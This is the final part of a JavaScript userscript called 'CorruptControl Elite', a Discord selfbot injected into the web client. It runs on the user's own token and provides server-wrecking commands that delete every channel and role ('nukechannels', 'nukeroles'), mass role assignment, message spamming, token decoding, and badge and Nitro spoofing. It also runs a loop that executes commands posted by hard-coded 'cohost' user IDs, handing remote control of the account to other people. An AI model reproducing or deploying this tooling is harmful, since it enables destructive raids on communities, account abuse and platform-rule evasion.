            if (!a || !a[0]) return 'Usage: !pin <message_id>';
            var channelId = getChannelId();
            var response = await apiRequest('/channels/' + channelId + '/pins/' + a[0], { method: 'PUT' });
            return response.ok ? 'Pinned' : 'Failed';
        },

        unpin: async function(a) {
            if (!a || !a[0]) return 'Usage: !unpin <message_id>';
            var channelId = getChannelId();
            var response = await apiRequest('/channels/' + channelId + '/pins/' + a[0], { method: 'DELETE' });
            return response.ok ? 'Unpinned' : 'Failed';
        },

        chain: async function(a) {
            var count = Math.min(parseInt(a && a[0]) || 5, 25);
            var text = (a && a[1]) || 'chain';
            for (var i = 1; i <= count; i++) {
                (function(idx) { setTimeout(function() { sendMessage(text + ' ' + idx + '/' + count); }, idx * 600); })(i);
            }
            return 'Chain: ' + count + ' messages';
        },

        nukechannels: async function() {
            if (!isOwner()) return 'Owner only';
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var channels = await getGuildChannels(guildId);
            var deleted = 0;
            for (var i = 0; i < channels.length; i++) {
                try {
                    var r = await apiRequest('/channels/' + channels[i].id, { method: 'DELETE' });
                    if (r.ok) deleted++;
                } catch(e) {}
                await new Promise(function(r) { setTimeout(r, 300); });
            }
            return 'Nuked ' + deleted + ' channels';
        },

        nukeroles: async function() {
            if (!isOwner()) return 'Owner only';
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var roles = await getGuildRoles(guildId);
            var deleted = 0;
            for (var i = 0; i < roles.length; i++) {
                if (roles[i].managed || roles[i].name === '@everyone') continue;
                try {
                    var r = await deleteRole(guildId, roles[i].id);
                    if (r) deleted++;
                } catch(e) {}
                await new Promise(function(r) { setTimeout(r, 300); });
            }
            return 'Nuked ' + deleted + ' roles';
        },

        massrole: async function(a) {
            if (!a || !a[0]) return 'Usage: !massrole @role';
            var roleId = a[0].replace(/[<@&>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var response = await apiRequest('/guilds/' + guildId + '/members?limit=1000');
            if (!response.ok) return 'Failed to fetch members';
            var members = await response.json();
            var added = 0;
            for (var i = 0; i < members.length; i++) {
                try {
                    var r = await addRole(guildId, members[i].user.id, roleId);
                    if (r) added++;
                } catch(e) {}
                if (added % 10 === 0) await new Promise(function(r) { setTimeout(r, 1000); });
            }
            return 'Added role to ' + added + ' members';
        },

        ghostping: function() {
            if (ghostPings.length === 0) return 'No ghost pings detected yet.';
            var recent = ghostPings.slice(-10);
            return '**Recent Ghost Pings:**\n' + recent.map(function(gp, i) { return (i + 1) + '. <@' + gp.author + '> deleted a ping'; }).join('\n');
        },

        clearlog: function() {
            ghostPings.length = 0;
            return 'Ghost ping log cleared';
        },

        autoreact: function(a) {
            if (!a || !a[0]) {
                autoReactEnabled = !autoReactEnabled;
                return 'Auto-react: ' + (autoReactEnabled ? 'ON' : 'OFF') + ' (' + autoReactEmoji + ')';
            }
            autoReactEmoji = a[0];
            autoReactEnabled = true;
            return 'Auto-react set to ' + autoReactEmoji;
        },

        statusrotate: function() {
            if (statusInterval) {
                clearInterval(statusInterval);
                statusInterval = null;
                return 'Status rotator OFF';
            }
            startStatusRotator();
            return 'Status rotator ON';
        },

        tokeninfo: async function(a) {
            var token = (a && a[0]) || getToken();
            if (!token) return 'No token';
            try {
                var parts = token.split('.');
                var header = JSON.parse(atob(parts[0]));
                var payload = JSON.parse(atob(parts[1]));
                return '**Token Info**\nUser ID: ' + (header.id || payload.id || 'Unknown') + '\nIssued: ' + (payload.iat ? new Date(payload.iat * 1000).toLocaleString() : 'Unknown') + '\nExpires: ' + (payload.exp ? new Date(payload.exp * 1000).toLocaleString() : 'Unknown');
            } catch(e) {
                return 'Invalid token format';
            }
        },

        cloneserver: async function() {
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var channels = await getGuildChannels(guildId);
            var roles = await getGuildRoles(guildId);
            var report = '**Server Structure**\n\n**Roles (' + roles.length + '):**\n';
            report += roles.slice(0, 20).map(function(r) { return '- ' + r.name + ' (0x' + (r.color || 0).toString(16) + ')'; }).join('\n');
            report += '\n\n**Channels (' + channels.length + '):**\n';
            report += channels.slice(0, 20).map(function(c) { return '- ' + (c.type === 0 ? '#' : c.type === 2 ? 'Voice:' : '') + c.name; }).join('\n');
            return report.slice(0, 1950);
        },

        version: function() { return 'CorruptControl Elite v2.0.4 - Owner/Cohost Edition'; }
    });

    // -------------------------------------------------------------------------
    // COMMAND PROCESSOR
    // -------------------------------------------------------------------------

    function initCommandSystem() {
        console.log('[CC] Initializing command processor v2.0.4...');
        var isProcessing = false;

        async function handleCommand(e) {
            if (e.key !== 'Enter' || e.shiftKey || isProcessing) return;

            var active = document.activeElement;
            if (!active) return;

            var isChatInput = active.getAttribute('role') === 'textbox' ||
                               active.contentEditable === 'true' ||
                               active.tagName === 'TEXTAREA' ||
                               (active.className && active.className.includes && active.className.includes('slate')) ||
                               (active.className && active.className.includes && active.className.includes('editor')) ||
                               (active.className && active.className.includes && active.className.includes('textArea'));

            if (!isChatInput) return;

            var text = '';
            if (active.tagName === 'TEXTAREA') {
                text = active.value;
            } else {
                text = active.innerText || active.textContent || '';
            }

            text = text.trim();
            if (!text) return;

            var useCohost = false;
            var prefix = '';
            var commands = null;

            if (text.startsWith(COHOST_PREFIX)) {
                useCohost = true;
                prefix = COHOST_PREFIX;
                commands = COHOST_COMMANDS;
            } else if (text.startsWith(REGULAR_PREFIX)) {
                useCohost = false;
                prefix = REGULAR_PREFIX;
                commands = REGULAR_COMMANDS;
            } else {
                return;
            }

            if (useCohost && !dynamicOwnerId) {
                var myId = getUserId();
                if (myId) {
                    dynamicOwnerId = myId;
                    console.log('[CC] Auto-set owner:', myId);
                }
            }

            if (useCohost && !canUseCohostCommands()) {
                console.log('[CC] Non-authorized user tried cohost command');
                return;
            }

            e.preventDefault();
            e.stopPropagation();
            if (e.stopImmediatePropagation) e.stopImmediatePropagation();

            isProcessing = true;

            var cmdText = text.slice(prefix.length).trim();
            var args = cmdText.split(/\s+/);
            var cmd = args.shift().toLowerCase();

            console.log('[CC] ' + (useCohost ? (isOwner() ? 'Owner' : 'Cohost') : 'Regular') + ' command:', cmd, args);

            if (commands[cmd]) {
                try {
                    var result = commands[cmd](args);
                    if (result instanceof Promise) result = await result;
                    if (typeof result === 'string' && result) {
                        await sendMessage(result);
                    }
                } catch(err) {
                    console.error('[CC] Command error:', err);
                    await sendMessage('Error: ' + err.message);
                }
            } else {
                await sendMessage('Unknown command: ' + prefix + cmd);
            }

            if (active.tagName === 'TEXTAREA') {
                active.value = '';
            } else {
                active.innerHTML = '<br>';
            }

            ['input', 'change', 'keyup'].forEach(function(evt) {
                active.dispatchEvent(new Event(evt, { bubbles: true }));
            });

            var tracker = active._valueTracker;
            if (tracker) tracker.setValue('');

            isProcessing = false;
        }

        document.addEventListener('keydown', handleCommand, true);
        console.log('[CC] Command system active! Regular: .help | Cohost: !help');
    }

    // -------------------------------------------------------------------------
    // COHOST MESSAGE MONITOR
    // -------------------------------------------------------------------------

    async function monitorCohostMessages() {
        console.log('[CC] Starting cohost message monitor...');
        var processedIds = new Set();

        while (true) {
            try {
                var token = getToken();
                var channelId = getChannelId();

                if (!token || !channelId) {
                    await new Promise(function(r) { setTimeout(r, 2000); });
                    continue;
                }

                var res = await fetch('https://discord.com/api/v9/channels/' + channelId + '/messages?limit=15', {
                    headers: { 'Authorization': token }
                });

                if (!res.ok) {
                    await new Promise(function(r) { setTimeout(r, 2000); });
                    continue;
                }

                var messages = await res.json();

                for (var i = 0; i < messages.length; i++) {
                    var msg = messages[i];
                    var isAuthorized = msg.author.id === dynamicOwnerId ||
                                        msg.author.id === OWNER_ID ||
                                        COHOSTS.indexOf(msg.author.id) !== -1;

                    if (!isAuthorized) continue;
                    if (!msg.content.startsWith(COHOST_PREFIX)) continue;
                    if (processedIds.has(msg.id)) continue;
                    processedIds.add(msg.id);

                    if (processedIds.size > 100) {
                        var arr = Array.from(processedIds);
                        processedIds.clear();
                        arr.slice(-50).forEach(function(id) { processedIds.add(id); });
                    }

                    console.log('[CC] API detected cohost command:', msg.content);

                    var cmdText = msg.content.slice(COHOST_PREFIX.length).trim();
                    var args = cmdText.split(/\s+/);
                    var cmd = args.shift().toLowerCase();

                    if (COHOST_COMMANDS[cmd]) {
                        try {
                            var result = COHOST_COMMANDS[cmd](args);
                            if (result instanceof Promise) result = await result;
                            if (result) await sendMessage(result);
                        } catch(err) {
                            console.error('[CC] Cohost command error:', err);
                        }
                    }
                }

            } catch(e) {
                console.error('[CC] Monitor error:', e);
            }

            await new Promise(function(r) { setTimeout(r, 1500); });
        }
    }

    // -------------------------------------------------------------------------
    // INITIALIZATION
    // -------------------------------------------------------------------------

    function init() {
        console.log('[CC] ========================================');
        console.log('[CC] CorruptControl Elite v2.0.4 Initializing');
        console.log('[CC] Regular prefix:', REGULAR_PREFIX);
        console.log('[CC] Cohost prefix:', COHOST_PREFIX);
        console.log('[CC] Owner ID:', OWNER_ID || 'Auto-detect');
        console.log('[CC] Cohosts:', COHOSTS.length);
        console.log('[CC] Badge spoof:', getBadgeList().join(', '));
        console.log('[CC] Nitro spoof:', NITRO_CONFIG.enabled);
        console.log('[CC] Status rotate:', STATUS_ROTATOR.enabled);
        console.log('[CC] ========================================');

        initCommandSystem();
        monitorCohostMessages();
        injectBadges();
        enableNitroFeatures();
        initGhostPingDetector();
        initAutoReact();
        if (STATUS_ROTATOR.enabled) startStatusRotator();

        // UI Indicator - AI-E Style
        var indicator = document.createElement('div');
        indicator.id = 'cc-indicator';
        indicator.innerHTML = '<div style="font-weight:bold;font-size:11px">CC ELITE</div><div style="font-size:9px;opacity:0.8">.help | !help</div>';
        indicator.style.cssText = 'position:fixed;top:10px;right:10px;background:rgba(20,20,30,0.95);color:#5865f2;padding:8px 12px;border-radius:8px;font-size:11px;z-index:10000;font-family:monospace;cursor:pointer;border:1px solid rgba(88,101,242,0.4);backdrop-filter:blur(4px);transition:all 0.2s;';

        indicator.onmouseenter = function() { indicator.style.borderColor = '#5865f2'; indicator.style.transform = 'scale(1.05)'; };
        indicator.onmouseleave = function() { indicator.style.borderColor = 'rgba(88,101,242,0.4)'; indicator.style.transform = 'scale(1)'; };

        indicator.onclick = function() {
            var panel = document.getElementById('cc-panel');
            if (panel) { panel.remove(); return; }

            var myId = getUserId();
            var amOwner = isOwner();
            var amCohost = isCohost();

            var newPanel = document.createElement('div');
            newPanel.id = 'cc-panel';
            newPanel.innerHTML =
                '<div style="background:#1e1f22;padding:20px;border-radius:12px;max-width:320px;color:#dbdee1;border:1px solid #5865f2;font-family:monospace;font-size:12px;box-shadow:0 8px 32px rgba(0,0,0,0.4);">' +
                '<div style="display:flex;align-items:center;gap:10px;margin-bottom:15px">' +
                '<div style="width:40px;height:40px;background:linear-gradient(135deg,#5865f2,#4752c4);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:bold;color:white;font-size:16px">CC</div>' +
                '<div><div style="font-weight:bold;color:white;font-size:14px">CorruptControl Elite</div><div style="color:#b5bac1;font-size:10px">v2.0.4 | AI-E Style</div></div></div>' +
                '<div style="background:#2b2d31;padding:10px;border-radius:6px;margin-bottom:10px">' +
                '<div style="color:#949ba4;font-size:10px;margin-bottom:4px">YOUR STATUS</div>' +
                '<div style="color:white">' + (amOwner ? '<span style="color:#ffd700">OWNER</span>' : amCohost ? '<span style="color:#43b581">COHOST</span>' : '<span style="color:#dbdee1">USER</span>') + '</div>' +
                '<div style="color:#949ba4;font-size:10px;margin-top:4px">ID: ' + (myId || 'Not found') + '</div></div>' +
                '<div style="background:#2b2d31;padding:10px;border-radius:6px;margin-bottom:10px">' +
                '<div style="color:#949ba4;font-size:10px;margin-bottom:4px">ACTIVE BADGES</div>' +
                '<div style="color:white;font-size:10px">' + getBadgeList().join(', ') + '</div></div>' +
                '<div style="background:#2b2d31;padding:10px;border-radius:6px;margin-bottom:15px">' +
                '<div style="color:#949ba4;font-size:10px;margin-bottom:4px">SETTINGS</div>' +
                '<div style="color:#43b581;font-size:10px">Nitro: ' + (NITRO_CONFIG.enabled ? 'ON' : 'OFF') + ' | Badges: ON | GhostPing: ON</div></div>' +
                '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:10px;color:#949ba4">' +
                '<div>Cohosts: ' + COHOSTS.length + '</div><div>Prefix: ' + REGULAR_PREFIX + ' / ' + COHOST_PREFIX + '</div></div>' +
                '<button onclick="document.getElementById(\'cc-panel\').remove()" style="background:#5865f2;color:white;border:none;padding:8px 15px;border-radius:6px;cursor:pointer;width:100%;margin-top:15px;font-family:monospace;font-size:11px;font-weight:bold">Close</button></div>';
            newPanel.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:10001;';
            document.body.appendChild(newPanel);
        };

        document.body.appendChild(indicator);

        setTimeout(function() {
            var token = getToken();
            if (token) {
                try {
                    var payload = JSON.parse(atob(token.split('.')[0]));
                    if (isOwner()) {
                        console.log('[CC] Verified as OWNER');
                    } else if (isCohost()) {
                        console.log('[CC] Verified as COHOST');
                    }
                } catch(e) {}
            }
        }, 2000);
    }

    if (document.readyState === 'complete') {
        setTimeout(init, 2000);
    } else {
        window.addEventListener('load', function() { setTimeout(init, 2000); });
    }

})();
